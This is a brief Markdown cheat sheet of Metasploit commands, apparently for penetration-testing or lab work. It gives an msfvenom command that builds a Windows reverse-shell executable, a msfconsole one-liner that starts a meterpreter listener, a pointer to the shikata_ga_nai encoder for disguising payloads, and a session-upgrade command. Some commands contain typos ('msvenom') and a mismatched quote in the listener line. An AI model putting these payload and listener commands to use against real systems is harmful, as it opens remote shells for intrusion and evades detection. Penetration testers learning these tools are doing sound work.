# Metasploit commands

## Basics

basic msvenom reverse-shell payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=${PORT} -f exe -o shell
```

One-liner for setting up a listener
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT "6666'; exploit"

```
## encoding

To see encoders available to you, use `msvenom -l encoders`.

Then, you can something like `-e x86/shikata_ga_nai` when creating the payload.

## Session handling

upgrade recent session to meterpreter session: `sessions -u -1`
